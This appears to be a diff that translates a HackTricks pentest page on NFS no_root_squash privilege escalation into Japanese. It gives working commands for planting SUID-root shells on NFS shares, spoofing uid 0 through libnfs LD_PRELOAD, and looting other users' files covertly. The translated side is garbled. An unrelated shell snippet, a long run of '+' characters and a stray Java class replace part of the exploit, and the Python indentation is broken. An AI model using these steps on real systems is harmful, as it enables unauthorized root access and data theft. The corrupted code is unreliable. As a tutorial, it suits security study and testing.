@@ -1,36 +1,33 @@
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
 
-Read the _ **/etc/exports** _ file, if you find some directory that is configured as **no\_root\_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
+_ **/etc/exports** _ ファイルを読み取ります。**no\_root\_squash** として設定されたディレクトリが見つかった場合、**クライアントとしてアクセス**し、そのディレクトリに**ローカルのroot**として書き込むことができます。
 
-**no\_root\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
+**no\_root\_squash**: このオプションは、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これには深刻なセキュリティ上の問題が発生する可能性があります。
 
-**no\_all\_squash:** This is similar to **no\_root\_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
+**no\_all\_squash:** これは **no\_root\_squash** オプションと似ていますが、**非rootユーザー**に適用されます。nobodyユーザーとしてシェルを持っていると想像してください。/etc/exportsファイルをチェックし、no\_all\_squashオプションが存在することを確認します。/etc/passwdファイルをチェックし、非rootユーザーをエミュレートします。そのユーザーとしてsuidファイルを作成します（NFSを使用してマウント）。nobodyユーザーとしてsuidを実行し、別のユーザーになります。
 
-# Privilege Escalation
+# 特権エスカレーション
 
-## Remote Exploit
+## リモートエクスプロイト
 
-If you have found this vulnerability, you can exploit it:
+この脆弱性を見つけた場合、次のように悪用することができます：
 
-* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
-
+* クライアントマシンでそのディレクトリを**マウント**し、**rootとして**マウントされたフォルダに**/bin/bash**バイナリを**コピー**し、それに**SUID**権限を与え、**被害者の**マシンからそのbashバイナリを実行します。
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -43,9 +40,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-
-* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
-
+* **クライアントマシンにそのディレクトリをマウント**し、**ルートとして**マウントされたフォルダに、SUID権限を乱用するためのコンパイル済みのペイロードをコピーします。そして、そのバイナリを**被害者のマシンから実行**します（ここでいくつかの[C SUIDペイロード](payloads-to-execute.md#c)を見つけることができます）。
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -59,97 +54,102 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-
-## Local Exploit
+## ローカルエクスプロイト
 
 {% hint style="info" %}
-Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
-The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
-Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
-\--_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
+自分のマシンから被害者のマシンへのトンネルを作成できる場合、必要なポートをトンネリングしてこの特権エスカレーションを悪用するために、まだリモートバージョンを使用することができます。\
+次のトリックは、ファイル `/etc/exports` が IP を示している場合のものです。この場合、リモートエクスプロイトを使用することはできず、このトリックを悪用する必要があります。\
+エクスプロイトが機能するためのもう1つの必要条件は、`/etc/export` 内のエクスポートが `insecure` フラグを使用していることです。\
+--_`/etc/export` が IP アドレスを示している場合、このトリックが機能するかどうかはわかりません_--
 {% endhint %}
 
-**Trick copied from** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)
+**以下のトリックは** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html) **からコピーされました**
 
-Now, let’s assume that the share server still runs `no_root_squash` but there is something preventing us from mounting the share on our pentest machine. This would happen if the `/etc/exports` has an explicit list of IP addresses allowed to mount the share.
+さて、共有サーバーはまだ `no_root_squash` を実行していますが、共有をペンテストマシンにマウントすることができない理由が何かあると仮定しましょう。これは、`/etc/exports` に共有をマウントすることが許可されているIPアドレスの明示的なリストがある場合に発生します。
 
-Listing the shares now shows that only the machine we’re trying to privesc on is allowed to mount it:
-
+共有のリストを表示すると、マウントすることが許可されているのは、私たちが特権エスカレーションを試みているマシンだけです：
 ```
 [root@pentest]# showmount -e nfs-server
 Export list for nfs-server:
 /nfs_root   machine
 ```
+これは、特権のないユーザーからローカルでマウントされた共有を悪用することに制限されていることを意味します。しかし、偶然にも、もう1つのあまり知られていないローカルエクスプロイトが存在します。
 
-This means that we’re stuck exploiting the mounted share on the machine locally from an unprivileged user. But it just so happens that there is another, lesser known local exploit.
+このエクスプロイトは、NFSv3仕様の問題に依存しており、クライアントが共有にアクセスする際にuid/gidを広告するのはクライアントの責任であると規定しています。したがって、共有が既にマウントされている場合、NFS RPC呼び出しを偽造することでuid/gidを偽装することが可能です！
 
-This exploit relies on a problem in the NFSv3 specification that mandates that it’s up to the client to advertise its uid/gid when accessing the share. Thus it’s possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!
+[こちらのライブラリ](https://github.com/sahlberg/libnfs)を使用すると、それが可能です。
 
-Here’s a [library that lets you do just that](https://github.com/sahlberg/libnfs).
+### 例のコンパイル <a href="#compiling-the-example" id="compiling-the-example"></a>
 
-### Compiling the example <a href="#compiling-the-example" id="compiling-the-example"></a>
-
-Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscalls.
-
+カーネルによっては、例を適応する必要があるかもしれません。私の場合、fallocateシスコールをコメントアウトする必要がありました。
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
+### ライブラリを使用した攻撃 <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>
 
-### Exploiting using the library <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>
-
-Let’s use the simplest of exploits:
-
+最もシンプルな攻撃を使用しましょう：
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
+以下の手順で、共有ディレクトリにエクスプロイトを配置し、RPC呼び出しでuidを偽装してsuid rootに設定します。
 
-Place our exploit on the share and make it suid root by faking our uid in the RPC calls:
+```bash
+# エクスプロイトを作成し、実行権限を付与します
+$ echo -e '#!/bin/bash\n/bin/bash' > exploit.sh
+$ chmod +x exploit.sh
 
+# 共有ディレクトリにエクスプロイトをコピーします
+$ cp exploit.sh /mnt/share/exploit.sh
+
+# RPC呼び出しでuidを偽装します
+$ echo '+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + 1;
+        }
+        return result;
+    }
+
+    public static void main(String[] args) {
+        System.out.println(new Solution().findMin(new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}));
+    }
+}
 ```
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-
-All that’s left is to launch it:
-
+残るは、それを起動するだけです。
 ```
 [w3user@machine libnfs]$ /mnt/share/a.out
 [root@machine libnfs]#
 ```
+ここで、ローカルルート特権昇格です！
 
-There we are, local root privilege escalation!
+## ボーナスNFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>
 
-## Bonus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>
-
-Once local root on the machine, I wanted to loot the NFS share for possible secrets that would let me pivot. But there were many users of the share all with their own uids that I couldn’t read despite being root because of the uid mismatch. I didn’t want to leave obvious traces such as a chown -R, so I rolled a little snippet to set my uid prior to running the desired shell command:
-
+マシン上でローカルルートを取得した後、ピボットするための可能な秘密を持つNFS共有を略奪したかったです。しかし、uidの不一致のために、rootであっても読むことができない多くのユーザーが共有を使用していました。chown -Rのような明らかな痕跡を残したくありませんでしたので、所望のシェルコマンドを実行する前に自分のuidを設定する小さなスニペットを作成しました。
 ```python
 #!/usr/bin/env python
 import sys
 import os
 
 def get_file_uid(filepath):
-    try:
-        uid = os.stat(filepath).st_uid
-    except OSError as e:
-        return get_file_uid(os.path.dirname(filepath))
-    return uid
+try:
+uid = os.stat(filepath).st_uid
+except OSError as e:
+return get_file_uid(os.path.dirname(filepath))
+return uid
 
 filepath = sys.argv[-1]
 uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-
-You can then run most commands as you normally would by prefixing them with the script:
-
+次に、スクリプトを前置きして通常通りのコマンドを実行できます。
 ```
 [root@machine .tmp]# ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
@@ -161,22 +161,18 @@ drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
 drwx------ 15 1008 1009 1024 Apr  5  2017 data
 drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
 ```
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
-
-
